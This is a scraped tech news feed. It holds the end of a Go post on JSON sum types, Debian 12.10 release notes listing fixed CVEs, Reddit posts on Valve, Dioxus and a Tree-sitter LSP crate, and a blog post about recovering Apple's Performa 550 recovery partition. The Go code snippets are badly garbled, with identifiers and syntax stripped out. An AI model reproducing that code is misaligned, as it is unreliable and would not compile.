	 jsontaggedfirst encode the wrapped interface as JSON (unlike decoding, we can do this because the interface here will be initialized with an underlying concrete type: , , etc.)second, to add the tag in the  field, we do a roundtrip: decode into a , add the tag to that map, and re-encode the map into JSONNotice that I use the  linter in  to make sure I handle all possible tags, and I use the  linter in  to make sure I handle all possible variant structs. So given I keep the "enum" and "sum type" up-to-date, I will have exhaustiveness checking in both these methods (in addition to other methods or functions, such as  we saw earlier).That's it! Yes, there is a bit of boilerplate, but if one is using Go they are probably already OK with a little boilerplate here and there. Also, between AI coding assistants and other codegen tools, the cost of boilerplate can be mitigated. And finally there is that thing we say, "code is read (and maintained) much more often than written"? So I'd argue the added type-safety and the fact that we catch issues at compile time instead of runtime may be worth the tradeoff.Alternative implementationsOf course, the implementation described above is only  of decoding JSON sum types in Go. Below are a couple alternatives, some of which we've already mentioned. Action 
	createObject     CreateObject
	updateObject     UpdateObject
	deleteObject     DeleteObject
	deleteAllObjects DeleteAllObjects
 Action 
	payload jsonRawMessage
With the "sealed interface" approach I ended up using, I also considered an implementation of  that doesn't require an encode/decode roundtrip to add the tag, at the cost of a bit more boilerplate. It uses struct embedding instead (full example here):a Action data  err  v  avalueCreateObject
		tagged 
			Type ActionType 
			CreateObject
		
			Type         ActionType_CreateObject
			CreateObjectv
		data err  jsontagged data err
Finally, it is worth mentioning that there are different ways to represent sum types in JSON, notably: (the one used in this article): {"type": "delete_object", "id": "1", "soft_delete": true}: {"type": "delete_object", "value": {"id": "1", "soft_delete": true}}: {"delete_object": {"id": "1", "soft_delete": true}}The naming is taken from the Rust library Serde's documentation, which provides a good explanation and examples for each representation.All JSON representations are possible with the Go implementation of sum types described in this post (you can find the adjacently tagged full example here).What Go could have been: V lang?I'll let the project's website do its own marketing:V is very similar to Go. If you know Go, you already know ≈80% of V.[...] V is very similar to Go, and its domain is similar to Rust's [...]Wait... The simplicity of Go, but with enums and sum types? Yes, please!I tried porting my example to V, and I have to admit it works out quite nicely (full source here):
	user
	group

	id   
	name 
	object Object

	object Object

	id  CreateObject  UpdateObject  DeleteObject  DeleteAllObjects

action Action action 
		CreateObject 
		UpdateObject 
		DeleteObject 
		DeleteAllObjects The  expression has exhaustiveness checking, of course. And the  sum type decodes from/encodes to JSON right out-of-the box (with the caveat that, at the time of writing, it uses the adjacently tagged representation with no way of configuring it).Before getting too excited it is worth noting that V is very much a niche language, and can't be compared to Go's popularity and ecosystem. Our industry works in mysterious ways, who knows why some languages gain traction while others don't. Also, this might have some truth to it:There are only two kinds of languages: the ones people complain about and the ones nobody uses.Bjarne Stroustrup, The C++ Programming LanguageNevertheless, I found the V language interesting! It's a garbage-collected language that seems to have found a sweet spot between Go's simplicity and Rust's powerful type system.Examples in other languagesIf you made it this far, I'll leave you with a link to this repository. It contains an implementation of the example sum type from this article, with JSON encoding/decoding (where applicable), in the following languages:]]></content:encoded></item><item><title>Debian point release 12.10.....if you care and use.</title><link>https://www.debian.org/News/2025/20250315</link><author>/u/unixbhaskar</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 04:42:04 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[The Debian project is pleased to announce the tenth update of its
stable distribution Debian 12 (codename ).
This point release mainly adds corrections for security issues,
along with a few adjustments for serious problems. Security advisories
have already been published separately and are referenced where available.Please note that the point release does not constitute a new version of Debian
12 but only updates some of the packages included. There is
no need to throw away old  media. After installation,
packages can be upgraded to the current versions using an up-to-date Debian
mirror.Those who frequently install updates from security.debian.org won't have
to update many packages, and most such updates are
included in the point release.New installation images will be available soon at the regular locations.Upgrading an existing installation to this revision can be achieved by
pointing the package management system at one of Debian's many HTTP mirrors.
A comprehensive list of mirrors is available at:This stable update adds a few important corrections to the following packages:Fix crash when modifying userPassword using malformed input [CVE-2024-2199 CVE-2024-8445]; prevent denial of service while attempting to log in with a user with a malformed hash in their password [CVE-2024-5953]; prevent denial of service on the directory server with specially-crafted LDAP query [CVE-2024-3657]New upstream bugfix releaseFix tests causing FTBFS on the auto-builder networkFix unintended HTTPS upgrades or premature reversion to HTTP when both subdomains and parent domains are used [CVE-2024-9681]; prevent stopping of stunnel before retries in the built-time tests; fix possible credentials leakage issues [CVE-2024-11053 CVE-2025-0167]; fix test failures due to port clashesDo not cache result of get_default_value_for_fieldFix issue when rendering an invalid monochrome DICOM image [CVE-2024-47796]; ensure: HighBit < BitsAllocated [CVE-2024-52333]; fix possible overflows when allocating memory [CVE-2024-27628]; fix two segmentation faults [CVE-2024-34508 CVE-2024-34509]; fix arbitrary code execution issue [CVE-2024-28130]; fix buffer overflow issues [CVE-2025-25472 CVE-2025-25474]; fix NULL pointer dereference issue [CVE-2025-25475]Increase Linux kernel ABI to 6.1.0-32; rebuild against proposed-updatesAdd missing parameters for source upload targetFix authentication bypass [CVE-2024-21543]Fix overflow condition in PeCoffLoaderRelocateImage() [CVE-2024-38796]; fix potential UINT32 overflow in S3 ResumeCount [CVE-2024-1298]Fix tests on machines with 2 vCPU or fewerFix sandbox bypass vulnerability in Nasal scripts [CVE-2025-0781]Fix build failure on single-CPU machinesFix buffer overflow when printing assertion failure message [CVE-2025-0395]; fix memset performance for unaligned destinations; fix TLS performance degradation after dlopen() usage; avoid integer truncation when parsing CPUID data with large cache sizes; ensure data passed to the rseq syscall are properly initializedNew upstream security release [CVE-2023-34440 CVE-2023-43758 CVE-2024-24582 CVE-2024-28047 CVE-2024-28127 CVE-2024-29214 CVE-2024-31068 CVE-2024-31157 CVE-2024-36293 CVE-2024-37020 CVE-2024-39279 CVE-2024-39355]Fix arbitrary code execution issues [CVE-2024-56201 CVE-2024-56326]Fix build failure on single-CPU systemsFix CSRF vulnerability on 2FA registration interface [CVE-2024-52948]Set correct default permissions for shared memory [CVE-2024-46544]Fix buffer overflow vulnerability [CVE-2023-32181 CVE-2023-22652]Add option to read username/password from file [CVE-2023-35789]Fix out-of-bounds read in gnu_longlink() [CVE-2021-33643]; fix out-of-bounds read in gnu_longname() [CVE-2021-33644]; fix memory leak in th_read() [CVE-2021-33645]; fix memory leak in th_read() [CVE-2021-33646]New upstream release; bump ABI to 32Fix multi axes movement on single axis G0 MDI callNew upstream stable release; fix security issue [CVE-2024-21096]; fix denial of service issue [CVE-2025-21490]Impose response limits on HTTP server connections [CVE-2025-26819]Install fcitx icons to the correct locationsIgnore test warnings from astropyFix possible bypass of client certificate authentication [CVE-2025-23419]Fix CSRF vulnerability [CVE-2023-45857]; fix potential vulnerability in URL when determining an origin [CVE-2024-57965]Fix mishandling of non-integer values leading to denial of service in nanoid [CVE-2024-55565]; fix parsing of external untrusted CSS [CVE-2023-44270]Fix build failure arising from changed timeout APINew upstream stable release; harden PQescapeString and allied functions against invalidly-encoded strings; improve behavior of libpq's quoting functions [CVE-2025-1094]Fix behavior when parsing chunked transfer encoding bodies and zero-length Content-Length headers [CVE-2023-40175]; limit size of chunk extensions [CVE-2024-21647]; prevent manipulation of headers set by intermediate proxies [CVE-2024-45614]Fix regular expression-based denial of service issue [CVE-2023-36053], denial of service issues [CVE-2024-38875 CVE-2024-39614 CVE-2024-41990 CVE-2024-41991], user enumeration issue [CVE-2024-39329], directory traversal issue [CVE-2024-39330], excessive memory consumption issue [CVE-2024-41989], SQL injection issue [CVE-2024-42005]Run tests only if /tmp is tmpfs, otherwise they are known to failAvoid segmentation fault if a SIGTERM is received during startupFix parallel running of testsFix sandbox bypass vulnerability in Nasal scripts [CVE-2025-0781]Apply GPO policy consistently [CVE-2023-3758]Fix vulnerable parsing of control characters in paths served by mod_dav_svn [CVE-2024-46901]Ignore test warnings from astropyNew upstream release; update data for Paraguay; update leap second informationFix URL of public Vagrant registryFix crash when expanding  in substitute [CVE-2023-2610]; fix buffer-overflow in vim_regsub_both() [CVE-2023-4738]; fix heap use after free in ins_compl_get_exp() [CVE-2023-4752]; fix heap-buffer-overflow in vim_regsub_both [CVE-2023-4781]; fix buffer-overflow in trunc_string() [CVE-2023-5344]; fix stack-buffer-overflow in option callback functions [CVE-2024-22667]; fix heap-buffer-overflow in ins_typebuf (CVE-2024-43802]; fix use-after-free when closing a buffer [CVE-2024-47814]; fix build failure on 32-bit architecturesFix mishandling of semicolons in userinfo in URLs [CVE-2024-38428]Allow direct kernel boot with kernels >= 6.12This revision adds the following security updates to the stable release.
The Security Team has already released an advisory for each of these
updates:The following packages were removed due to circumstances beyond our control:The installer has been updated to include the fixes incorporated
into stable by the point release.The complete lists of packages that have changed with this revision:The current stable distribution:Proposed updates to the stable distribution:stable distribution information (release notes, errata etc.):Security announcements and information:The Debian Project is an association of Free Software developers who
volunteer their time and effort in order to produce the completely
free operating system Debian.For further information, please visit the Debian web pages at
https://www.debian.org/, send mail to
<press@debian.org>, or contact the stable release team at
<debian-release@lists.debian.org>.]]></content:encoded></item><item><title>What is Valve&apos;s end goal with linux and gaming?</title><link>https://www.reddit.com/r/linux/comments/1jcd0vy/what_is_valves_end_goal_with_linux_and_gaming/</link><author>/u/Karmic_Backlash</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 03:51:33 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[I'll be the first to admit that I am a bit of a fan of valve if only at least in Stockholm Syndrome. I own a steamdeck and use their storefront, and have bought many games from them. However, as a linux user, over the years I've developed a strange feeling about their linux push. So, first thing thats crossed my mind is their main selling point in the space, Proton (and by proxy, wine). The whole idea is running windows applications and specifically games on linux. But that doesn't really feel like a long term solution. It basically requires that anything to do with gaming necessarily depends on windows and its systems. If people just stopped making windows builds of their stuff then linux gaming would suffer just as much.You would think that by now they would have tried to address this, and while I know the classic XKCD joke of "14 Competing Standards" rings here, but Valve has the best chance out of everyone to try, even if it fails, they'd still ideally have wine to fall back on.My second question is more to do with their lack of any movement outside of gaming. Don't get me wrong, they are a  platform and gaming focused developer. I'm not expecting them to shoulder the whole of the desktop on their shoulders, but it would be a serious feather in their cap to directly advertise that their software can do more then  gaming. The whole desktop mode of their flagship distro is fully featured just like any other.Third question, and this is more of a plea for context if it exists then a question, have they said anything about their long term goals anywhere, because I haven't heard anything. I'd love to know if they do actually have a roadmap, if only to know how to set my expectations.]]></content:encoded></item><item><title>Dioxus 0.6 is incredible, why isn&apos;t anyone talking about it.</title><link>https://www.reddit.com/r/rust/comments/1jcar25/dioxus_06_is_incredible_why_isnt_anyone_talking/</link><author>/u/Incredible_guy1</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 01:43:33 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[Iv'e been using tauri for a while to build my desktop apps and whiles its an amazing tool, a few of my complains include:projects become too complex to manageDioxus basically fixes all of this and keeps everything in native rust , while using a tsx-like syntax for building , how does this not get the spotlight?]]></content:encoded></item><item><title>I built a crate to generate LSP servers using Tree-sitter queries.</title><link>https://www.reddit.com/r/rust/comments/1jcajk7/i_built_a_crate_to_generate_lsp_servers_using/</link><author>/u/adclz</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 01:32:43 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[This is my second side project in Rust. There are probably some issues, and I haven’t implemented all the features I have in mind yet.The main inspiration comes from GitHub’s StackGraph. Since VS Code released an SDK last summer that allows LSP servers to run when compiled to WASI, I wanted to create something that could generate a cross-platform extension from any Tree-sitter grammar.It all started as a draft, but I ended up enjoying working on it a bit too much.]]></content:encoded></item><item><title>Apple&apos;s long-lost hidden recovery partition from 1994 has been found</title><link>https://www.downtowndougbrown.com/2025/03/apples-long-lost-hidden-recovery-partition-from-1994-has-been-found/</link><author>chmaynard</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 00:07:03 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[In my last post about hard drives that go bad over time, I hinted at having rescued a lost piece of obscure Apple software history from an old 160 MB Conner hard drive that had its head stuck in the parked position. This post is going to be all about it. It’s the tale of a tad bit of an obsession, what felt like a hopeless search, and how persistence eventually paid off. There’s still an unsolved mystery too, so I’m hoping others will see this and help to fill in the blanks!The LC 550’s Secret PartitionIf Apple’s programmers, in creating the Performa series, were aiming to make idiot-proof computers, they were serious about it. The Performa 550 is an amazing case in point. When you run the included Apple Backup program (see Chapter 15), you get a little surprise that you didn’t count on: a  on your hard drive!This invisible chunk of hard drive space contains a miniature, invisible System Folder. Apple’s internal memo explains it this way:“When a system problem (one that prevents the Performa from booting) is detected, a [dialog box] informs the user of a system problem. The user can choose to fix the problem manually or to reinstall software from the backup partition’s Mini System Folder.”If you choose to reinstall your System software, you get the wristwatch cursor for a moment while the miniature System Folder is silently copied to your main hard-drive partition. The Performa restarts from the restored hard drive, and the invisible system partition disappears once again.We got a Performa team member to admit that this kind of sneaky save-the-users-from-themselves approach may well be adopted in other Performa models.Who knows what goodness lurks in the hearts of men?Cool! Although I have owned my own copy of this book for decades, I had no recollection of ever reading this little blurb. The book, if you’re curious, is Macworld Mac Secrets by David Pogue and Joseph Schorr. I found this whole functionality very intriguing, particularly because I had what felt like a very personal connection to it: the very first Mac that my family had when I was growing up was a Performa 550. I don’t think I have any pictures from back then, but in the meantime I’ve acquired one that looks exactly identical, so here’s a (slightly blurry) view of the type of machine I’m talking about in this post:I know that many people think the LC/Performa 5xx case style is ugly, but I really like it! I’m definitely biased though.This is an early model manufactured in September of 1993, which came with a caddy-loading CD-ROM drive (AppleCD 300i). Like other Macs from the same era, newer versions from 1994 came with a tray-loading drive instead (AppleCD 300i Plus). For comparison, here’s a photo of a late-model Performa 550 with a manufacture date of March 1994 that re4mat kindly gave me permission to share here:Pierre asked me if I had a copy of Apple’s software restoration CD for the Performa 550, and if I knew how to get it working in an emulator in order to try out this special functionality. I pointed him to a download link for the Performa CD for the 500 Series, version 7.1P6:If you weren’t using multimedia computers in the early 1990s, you might not recognize the weird rectangular container that this CD is enclosed inside of. It’s a CD caddy, and it’s what was used for inserting CDs into computers like the first one pictured above. You would open the caddy by squeezing the top right and bottom right ends toward each other, stick the disc into it, close it, and then push it into the slot in the computer, similarly to how you would insert a floppy disk. I really don’t miss these things one bit!Back to the story, though. I also gave Pierre some tips for using the restore CD in an emulator. Nowadays, my advice is outdated because it’s much easier to use Apple restore CDs in at least one emulator — MAME has come a long way in the last few years. He figured out a bunch more stuff on his own after that, including trying it in his own Performa 450 (not 550), but the bottom line was that the recovery partition was nowhere to be found.Well, sort of. He found that the process of restoring from the CD actually did create a recovery partition. Here’s a screenshot of the partitioning from inside of Apple HD SC Setup while booted from the Performa CD, after formatting the hard drive by clicking the Initialize button in the main window:As you can see, there’s a 2,560 KB partition of type Apple_Recovery almost at the end of the drive, just after the main partition named “Hard Disk”. This was promising at first glance, but the partition was empty! Further testing revealed that the custom Performa-specific version of Apple HD SC Setup (7.2.2P6) bundled on the CD was responsible for creating it, but didn’t actually populate it with any data. Apple Backup also didn’t put anything onto the partition, despite what the book said. I even looked through my past disassemblies of the Apple Backup and Apple Restore code and confirmed that there was nothing related to creating a recovery partition.The conclusion at the time was that someone needed to get ahold of a Performa 550 that still had its original hard drive and had never been reformatted. That’s where this story sat for 3 years. A few months ago, I remembered this whole situation and decided that I really wanted to try to find this partition. After all, the clock had always been ticking. The longer we waited, the fewer and fewer original Performa 550s would be out there in the wild. Not to mention that hard drives go bad and people throw them out without knowing that it’s usually possible to recover data from drives of this era. I confirmed all of Pierre’s findings in MAME. I even tried using Apple Backup in case I missed something, but no, it didn’t do anything with the hidden recovery partition. An easy way to look at it is to manually edit the partition table in a hex editor and change the type from Apple_Recovery to Apple_HFS.After doing this and booting up, I found another hard drive icon on my desktop called Recovery Volume, but it was empty, just like Pierre said:Taking it a bit further, I tried recreating the recovery functionality myself. I copied a minimal system folder to the Recovery Volume, and then changed its type back to Apple_Recovery. This made it invisible again. Then I screwed up my main system folder and rebooted. Sure enough, it automatically came up with the Recovery Volume as the main boot volume.This proved that the mechanism for booting from the recovery partition worked; we were just missing the data that was supposed to be on it. I came to the same conclusion that Pierre had already reached: we needed to find a Performa 550 that had never been reformatted. In the meantime, I spent some time digging into archives of Apple’s old tech notes and found several more references to this functionality.Backup Partition Software-automatically detects corrupted system folders. When a bad System Folder is detected, the user is given the option to re-load another System Folder into their system.The Apple Backup application creates a backup recovery partition that allows the Performa to boot even when the System Software on the main hard drive has been corrupted. The partition is invisible to the user.There is no built-in limit to the number of times the backup partition can be used. However, the partition will be lost if the hard drive is re-formatted. At this time the backup partition is used only on the Performa 550.Performa 550: System Folder Created w/ Dinosaur Safari CD (8/94) — not that I needed any more proof of the recovery partition’s existence at this point, but I got a kick out of this one. It talks about how launching an educational game about dinosaurs accidentally caused the system to go into recovery mode. It provided a little more info about what would happen when the recovery dialog popped up:When I launch the Dinosaur Safari CD from Creative Multimedia, a dialog box appears telling me that my Performa computer is having trouble starting up. I only have two options Shutdown or Continue? Why?After reading these articles, I was very convinced that the recovery partition was a real thing that existed, but I was also pretty confident that Apple Backup wasn’t responsible for creating it, despite Apple claiming otherwise. I had already seen that the special build of Apple HD SC Setup was what actually created it, and plus, like I said earlier, I had looked closely into a disassembly of the version of Apple Backup supplied with the Performa 500 series restore CD. There was nothing that copied any files to another partition on the hard drive, at least not that I could see.Really, the most important thing I gained from this exercise was that the second tech note confirmed the need to find a Performa 550 that had never been reformatted. Also, if the first tech note was to be believed, it needed to have come with System 7.1P6. This could narrow the search even further — I know for a fact that earlier Performa 550 models came with 7.1P5, including my childhood one. The same tech note also pointed out that 7.1P6 was the first version to support the “AppleCD 300+”, which is referring to the tray-loading CD-ROM drive. Based on this information, it’s reasonable to deduce that all Performa 550s with a tray-loading CD-ROM drive would probably have originally come with at least System 7.1P6.There was only one thing left to try at this point: asking the Internet for help. I asked people everywhere I could think of: Tinker Different, 68kMLA (where Pierre had already asked), and various social media sites. I searched Reddit and found people who had posted in the past about having a 550, asking if they still had the hard drive. I think I scared some of them — at least one person deleted their post after I asked! To be honest, I can’t blame them. I can imagine how freaky it would be to hear from someone begging to look at my hard drive’s contents. I’m sure some people might think of it as crossing a line, but it’s not as crazy of an ask if it’s a machine they’ve received second-hand from someone else. Plus, I was very clear about exactly what I was looking for (and why).I asked a seller of a Performa 550 that had been sitting on eBay for a long time if they would be willing to sell me the hard drive separately. They weren’t interested. I even bought some random hard drives on eBay that definitely went with a 5xx-style case. These were easy to identify because this case style uses a unique adapter for plugging the drive into the chassis wiring harness when you slide it into place.What do I have to show for all of these eBay purchases? Well, after dumping them all with my ZuluSCSI in initiator mode, I can say that the one pictured above came from a Macintosh TV. I also found another one from an LC 575. Lastly, I bought yet another drive that the seller said came from a Performa 577. The Performa 577 one was funny — it had all the Mac mounting hardware on it, but when I dumped it, it turned out to be from an Atari TT or Falcon (not sure which). I’d love to hear the story of how it ended up with an LC 5xx drive sled and adapter on it! Needless to say, none of them had the elusive recovery partition. One particularly friendly eBay seller was even nice enough to show me a preview of a drive’s contents in HFSExplorer, which helped me determine that it wasn’t from a Performa.I almost began questioning my sanity at one point during this search. Multiple people initially told me that they thought I was confused about this whole thing. I pointed them toward Apple’s tech notes describing it. Were Pierre and I imagining this whole thing? Were Apple’s tech notes all a lie?The thing is, this whole functionality was super obscure. It’s understandable that people weren’t familiar with it. Apple publicly stated it was only included with this one specific Performa model. Their own documentation also said that it would be lost if you reformatted the hard drive. It was hiding in the background, so nobody really knew it was there, let alone thought about saving it. Also, I can say that the first thing a lot of people do when they obtain a classic computer is erase it in order to restore it to the factory state. Little did anyone know, if they reformatted the hard drive on a Performa 550, they could have been wiping out rare data that hadn’t been preserved!Someone who saw my post on Reddit mentioned that they had a Performa 550 and would check it out. It was a newer tray-loading model with a January 1994 manufacture date. Unfortunately, the Conner hard drive inside of it wouldn’t cooperate, and plus this person didn’t have anything capable of dumping the contents. Luckily for me though, they were totally comfortable with letting me borrow the drive and try to recover the data from it.To tie everything together, we have now reached the point in this story that I covered in my last post about hard drives with stuck heads. As I mentioned in that blog, I could not get this drive to do anything. It would just spin up, sit there for a while, spin down, and then make an annoying buzzing sound for a while, repeating that whole process over and over again.I tried all kinds of things. I nudged the head while the platters were spinning, inspected it with my thermal camera to see if any components were getting hot, and tried it at different temperatures — cold shortly after it arrived, and at room temperature later. The only thing I noticed was that when it was making the buzzing sound, one of the IRFD123 MOSFETs would get much hotter than normal: up near 100 degrees Celsius.I wasn’t really sure what to do with this information though. It just seemed wrong that the head wasn’t moving at all. That’s when I finally decided to inspect everything further inside the drive and noticed the head stack seemed like it was sticking to a rubber/plastic looking piece. The Kapton tape trick I figured out and showed off in the last post finally allowed me to dump the drive contents. If you didn’t catch it last time, here’s a video showing how it was stuck, along with a successful dump with the help of the tape:As soon as the drive imaging process completed, I powered everything off and anxiously opened the hard drive image file with my favorite hex editor (HxD):Boom! This drive had a recovery partition on it! Now, that didn’t necessarily mean anything. After all, I had already seen an empty partition created by Apple HD SC Setup on the Performa CD. Still, though, it was definitely promising. Here’s an interpretation of the data at the beginning of the entry in the partition table:50 4D = PM = Signature00 00 = Padding00 00 00 05 = 5 total partitions on the drive00 04 E2 60 = starting physical block of the partition (0x4E260 blocks = 0x9C4C000 bytes)00 00 14 00 = size of partition in blocks (0x1400 blocks = 0x280000 bytes = 2560 kilobytes)name = MacOSAlso, just like in the partition table created by the Performa CD that I had inspected earlier, there were four bytes “msjy” at an offset of 0x9C bytes into the partition table entry. No other partitions had any data at 0x9C. I wonder if these are a couple of developers’ initials hiding in there or something? Is it an acronym? “Make Steve Jobs Yodel”? I even asked ChatGPT to come up with a playful interpretation in the context of Macs in the mid-1990s. It suggested “My System Jammed Yesterday”, explaining it as a playful nod to the “chaotic charm” of the era’s extension conflicts and Sad Mac screens. I didn’t even mention anything about it involving OS recovery. Tell me how you really feel about old Macs, ChatGPT!Knowing that the partition was there, the next step was to look near the end of the dumped drive image in HxD. If the partition had any actual data stored, it would be very obvious because starting at 0x9C4C000 in the file, there would be actual data and not just a bunch of zeros.This is where I started to actually get excited. The partition contained boot blocks! This was obvious because of the starting signature of LK and all of the various system file names plainly visible. On the other hand, the recovery partition created by the Performa CD during testing had zeros at this location — no boot blocks.These boot blocks are identical to the main partition’s boot blocks, except for one very important difference: at 0x1A, the Pascal string containing the Finder name is “recovery” instead of “Finder” like you’d normally see. This means that if you boot from this partition, it will load a program named recovery instead of the usual Finder app you’d expect on most Mac OS installs.This was definitely something special that the restore CD was not capable of recreating. As I scrolled further down through the partition, it quickly became obvious that it actually had some files!Okay, now I was totally stoked! I booted up a copy of the imaged drive in MAME and immediately noticed that there was evidence that the recovery partition had definitely activated itself on this machine in the past: there was a folder named  on the desktop with a creation date in 2004, and the trash contained an app called Read Me Mini System Folder with the exact same date.I wanted to experience the automatic OS recovery process for myself without any customizations from the original owner of the machine this hard drive came from, so I used HxD to copy the entire 2,560 KB recovery partition onto the fresh hard drive image I had created by restoring from the Performa CD. This was easy because the Performa version of Apple HD SC Setup had created an empty recovery partition with the exact same size. Then I booted it up in MAME and dragged the System file out of my System Folder in order to intentionally mess it up. I had to turn off System Folder Protection in the Performa control panel first:This is the classic kind of mistake that would have normally left you with an unbootable system showing a floppy disk icon with a flashing question mark. Would Apple’s automatic Performa OS recovery save me from myself? I rebooted to see what would happen. Instead of seeing a flashing question mark, I saw a Happy Mac very briefly before the system rebooted itself again. Then another Happy Mac showed up, and this time, it looked like a normal boot, except no extension icons showed up at the bottom of the screen. It was definitely booting from the recovery partition. Eventually, I was greeted with this screen:Hooray! This was exactly the dialog box that Macworld Mac Secrets and Apple’s tech note had referred to. The recovery partition had been successfully rescued!Let’s walk through the rest of this feature. If you click Shut Down, obviously the machine turns itself off. But when it boots back up, the recovery partition doesn’t automatically kick in anymore. So you’re on your own to fix the problem by booting from the Performa CD or the Utilities floppy disk.On the other hand, clicking OK does exactly what the tech note describes. You get the wristwatch cursor for a few seconds, the system reboots, and then you are greeted with this amazing screen, complete with an ugly yellow desktop pattern. Shall we call it the yellow screen of shame? Notice that the Mini System Folder on the desktop is the active System Folder, because it has the special icon.Here are the rest of the pages in this Read Me Mini System Folder app:Aha! So it’s not entirely automatic, since you still have to manually drag the System, Finder, and System Enablers from the Mini System Folder back to your original System Folder. Still though, it’s a very handy solution that gives you a bootable machine when something goes wrong with your OS.If you just ignore these instructions and keep using the computer, you will be nagged with this Read Me on every boot because it lives inside the Startup Items folder of the Mini System Folder. The Read Me also appears on your desktop, but for some reason it doesn’t show up until you open the Hard Disk icon.Let’s take a deeper look at how it all works by temporarily changing the partition type to Apple_HFS instead of Apple_Recovery and booting up again, so we can inspect the files. After a quick automatic rebuild of the desktop file, the Recovery Volume appears, with actual contents this time!Inside of the System Folder, there are definitely some interesting things. As expected based on the earlier analysis of the boot blocks, there is an app named “recovery” that contains all of the interesting stuff. The icons are kind of arranged willy-nilly in here.The creator code of the recovery app is msjy — the exact same magic value we saw in the partition table entry.Scrolling further down, there is a System file and various enablers. Everything is marked as being part of System Software v7.1P6.It’s interesting to me that although this recovery partition was only available on the 550, it still has a bunch of enablers for other Performa models: the 45x/46x, 47x/57x, and 600. I guess that’s not too crazy considering all of these exact same enablers are included with a fresh copy of System 7.1P6 installed using the Performa CD.As a quick detour, System Enabler 316 is an interesting one that is hard to find info about on the Internet. I inspected its ‘gbly’ resource and determined that it’s for the Centris 610, Centris 650, and Quadra 800. It’s an older version of the enabler created before the speed-bumped Quadra 610 and Quadra 650 were a thing. I wonder if there was a plan at some point to have a Performa model based on one of those machines? If I had to guess, maybe it would have been a 68040-based successor to the Performa 600, which uses the same case style as the Centris 650. The Performa 650?Let’s not get too far off track. Back to the Recovery Volume’s System Folder — as expected, the Startup Items folder contains the Read Me application:Everything started to become clear. The recovery app was marked as the startup application instead of the Finder. It displayed the dialog giving the user the option to recover. If they clicked OK, it would copy the entire System Folder from the Recovery Volume, omitting itself, to the Desktop Folder of the main hard drive partition. Then, it would “bless” the newly-copied mini System Folder and reboot.How did all this stuff get into the partition? Did Apple Backup do it, or was it factory-programmed data? I tried to see if I could deduce anything from the dates of the files. In order to preserve the integrity of all of the displayed dates, I performed this analysis with a read-only copy of the original drive image in order to prevent any modification dates from being updated.All of the files in the partition have a creation date of March 4, 1994 — over 31 years ago! Most of the files have a matching modification date, except for the System suitcase, which was last modified on September 26, 1994. I don’t know exactly what this all means, considering it came from a machine with a January 1994 manufacture date.The Recovery Volume itself also has a creation date of March 4th, just five minutes before the creation date of all the files. Interestingly, the modification date of the volume is still shown as March 4th in the Get Info window, even though the System suitcase was modified later in September of that year.The Master Directory Block of the Recovery Volume says the modification date (drLsMod) is September 26th, matching when the System file was changed. I’m not sure what causes this discrepancy. I guess the date displayed in the Get Info window isn’t simply the date stored in the Master Directory Block.Similarly, although the main hard drive partition has a creation date of December 5, 1993 according to the Master Directory Block, the Get Info window says it was created on February 3, 1994. I’m not sure which one is more accurate. Either way, it’s pretty clear this drive had not been reformatted. I did find it curious that the recovery partition was created over a month later, though. When you reformat a hard drive using the special version of Apple HD SC Setup on the Performa CD, the recovery partition ends up with a creation date about a minute after the main partition.The Finder and System Enablers in the recovery partition are identical to the same stock files from a 7.1P6 restore. The only difference I could find in the System file was that the recovery partition’s version was missing a single At Ease ‘INIT’ resource, but the At Ease Startup extension automatically adds it to the System file after you reboot. This leaves you with a System file totally identical to what is restored from the Performa CD. I find it odd that At Ease was stripped out, but the American Heritage Dictionary ‘FKEY’ resource was not.The best theory that I can come up with is that Apple Backup really was responsible for creating this partition. After all, Apple went out of their way to specifically mention it in their tech note. Maybe March 4th, 1994 was the date when the original owner of the computer backed it up for the first time. September 26th could have been the last time that Apple Backup was run. Perhaps the owner completely uninstalled At Ease from the computer between March and September, so the System file had been changed and the recovery copy needed to be updated accordingly? Unfortunately, most of the Performa-specific software had been deleted from this computer. It was still running System 7.1P6, but Apple Backup was nowhere to be found. So I wasn’t able to confirm whether or not a mysterious, unpreserved newer version of Apple Backup was really responsible for populating the partition.The other theory floating around in my head is that maybe it came from the factory like this. The March 1994 timeline is consistent with the date of the tech note describing the functionality, so maybe that’s when Apple created it and started bundling it. I don’t know how long the machines sat at Apple’s factory before they were actually sold — does a manufacture date of January 1994 also mean it was shipped to a store in January 1994? Either way, I definitely don’t know how to explain the September 26th, 1994 modification date. Maybe a third-party utility did something to the System file on the secondary partition? The first Apple Backup theory seems like the more likely explanation, especially given that Apple said that’s how it was created.This whole question is the last piece of the puzzle that hasn’t been solved yet. If anyone else has a Performa 550 and would be willing to dump their hard drive or at least look at Apple Backup, I’d be very interested in finding out A) if it has the recovery partition and B) if there was a special newer version of Apple Backup that didn’t make its way onto the Performa CD. I searched for various strings that show up in the “recovery” and “Read Me Mini System Folder” apps, and they aren’t anywhere on the Performa CD. I guess they could be stored compressed somewhere, but I’m pretty confident based on the actual Apple Backup code that nothing is hiding in there. Here are the various versions (with their exact sizes and dates) of Apple Backup that I have seen on Performa 550 installations. None of these have the recovery partition creation built in:I also found version 1.3 (June 15, 1994, 163,388 bytes used) by restoring from a Performa 636 restore CD. It, too, does not contain any recovery partition code.For a demo, I thought it would be fun to replicate the problem that the Apple tech note mentioned about the Dinosaur Safari CD inadvertently activating the recovery partition, so I bought a copy to test it out. To make it even more interesting, I decided to run this test on real hardware. I’m leaning toward believing that a lot of the older caddy-loading models (possibly all of them) didn’t have this recovery partition, so just pretend it’s a newer model that came with System 7.1P6. I copied the recovery partition onto a real Apple-branded IBM 160 MB SCSI hard drive using ZuluSCSI’s USB 